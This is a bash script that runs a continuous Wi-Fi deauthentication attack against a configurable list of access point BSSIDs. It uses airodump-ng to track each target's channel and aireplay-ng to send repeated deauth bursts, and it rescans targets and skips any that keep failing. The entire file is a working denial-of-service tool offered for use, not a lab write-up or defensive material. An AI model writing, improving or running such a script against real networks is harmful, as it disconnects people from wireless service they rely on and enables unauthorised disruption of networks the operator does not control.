#!/usr/bin/env bash
# Filename: Autoaireplay.sh
# Purpose: Deauth loop with multiple BSSIDs, failure protection (skip after max fails)

# ==================== EDIT THESE VARIABLES ====================
INTERFACE="wlan0"

# Format: "BSSID|band|default_channel"
BSSIDS=(
    "74:B7:B3:30:6F:E4|bg|6"
    "74:B7:B3:30:6F:E5|a|153"
    # Add more...
)

DEAUTH_PACKETS=10
CHECK_INTERVAL=5
TIMEOUT_SEC=15
MAX_CONSECUTIVE_FAILS=10          # If a BSSID fails this many times in a row, skip it

# ==================== Functions ====================

switch_channel() {
    local ch="$1"
    echo "Switching to channel $ch using airmon-ng..."
    airmon-ng stop "$INTERFACE" >/dev/null 2>&1
    airmon-ng start wlan0 "$ch" >/dev/null 2>&1
    echo "airmon-ng start wlan0 $ch executed."
}

get_channel() {
    local bssid="$1"
    local band="$2"
    local scan_sleep=5
    if [[ "$band" == "a" ]]; then
        scan_sleep=8
    fi
    
    local tmp_prefix="/tmp/airodump_$$_${bssid//:/_}"
    
    timeout "$TIMEOUT_SEC" airodump-ng "$INTERFACE" \
        --bssid "$bssid" --band "$band" -w "$tmp_prefix" --output-format csv >/dev/null 2>&1 &
    local pid=$!
    
    sleep "$scan_sleep"
    
    kill -9 "$pid" 2>/dev/null
    wait "$pid" 2>/dev/null
    
    local csv_file="${tmp_prefix}-01.csv"
    
    if [[ -f "$csv_file" ]]; then
        local channel=$(grep -i "$bssid" "$csv_file" | head -1 | cut -d',' -f4 | tr -d ' ')
        if [[ "$channel" =~ ^[0-9]+$ && "$channel" -ge 1 && "$channel" -le 165 ]]; then
            rm -f "${tmp_prefix}"* 2>/dev/null
            echo "$channel"
            return
        fi
    fi
    
    rm -f "${tmp_prefix}"* 2>/dev/null
    echo "0"
}

# ==================== Main Program ====================

echo "===== Smart Deauth Loop Started (Multi-BSSID + Failure Protection) ====="
echo "Interface: $INTERFACE"
echo "Max consecutive fails to skip: $MAX_CONSECUTIVE_FAILS"
echo "Press Ctrl+C to stop"
echo ""

# Arrays and maps
declare -A channels
declare -A bands
declare -A fail_counts

for entry in "${BSSIDS[@]}"; do
    IFS='|' read -r bssid band default_ch <<< "$entry"
    echo "Loaded: $bssid ($band, default: $default_ch)"
    
    ch=$(get_channel "$bssid" "$band")
    if [[ "$ch" == "0" ]]; then
        ch="$default_ch"
        echo "First scan failed for $bssid - using default: $ch"
    fi
    
    channels["$bssid"]="$ch"
    bands["$bssid"]="$band"
    fail_counts["$bssid"]=0
done

# Start with first BSSID's channel
first_bssid=$(echo "${BSSIDS[0]}" | cut -d'|' -f1)
switch_channel "${channels[$first_bssid]}"

loop_count=0

while true; do
    ((loop_count++))

    for entry in "${BSSIDS[@]}"; do
        IFS='|' read -r bssid band default_ch <<< "$entry"
        ch="${channels[$bssid]}"
        
        # Skip if too many consecutive failures
        if (( fail_counts[$bssid] >= MAX_CONSECUTIVE_FAILS )); then
            echo "Skipping $bssid (too many consecutive failures: ${fail_counts[$bssid]})"
            continue
        fi
        
        echo "Attacking $bssid ($band, channel $ch)"
        switch_channel "$ch"
        output=$(aireplay-ng -0 "$DEAUTH_PACKETS" -a "$bssid" "$INTERFACE" --ignore-negative-one 2>&1)
        echo "$output"
        
        if echo "$output" | grep -iq "no such BSSID available"; then
            echo "Failure detected for $bssid - rescanning..."
            ((fail_counts[$bssid]++))
            
            new_ch=$(get_channel "$bssid" "$band")
            if [[ "$new_ch" != "0" ]]; then
                echo "Updated channel for $bssid: $ch -> $new_ch"
                channels["$bssid"]="$new_ch"
                fail_counts["$bssid"]=0  # Reset fail count on success
            else
                echo "Rescan failed for $bssid - fail count: ${fail_counts[$bssid]}"
            fi
        else
            # Success: reset fail count
            fail_counts["$bssid"]=0
        fi
    done

    # Periodic rescan
    if (( loop_count % CHECK_INTERVAL == 0 )); then
        echo "Periodic rescan..."
        for entry in "${BSSIDS[@]}"; do
            IFS='|' read -r bssid band default_ch <<< "$entry"
            new_ch=$(get_channel "$bssid" "$band")
            if [[ "$new_ch" != "0" && "$new_ch" != "${channels[$bssid]}" ]]; then
                echo "$bssid channel updated: ${channels[$bssid]} -> $new_ch"
                channels["$bssid"]="$new_ch"
                fail_counts["$bssid"]=0  # Reset on update
            fi
        done
    fi
done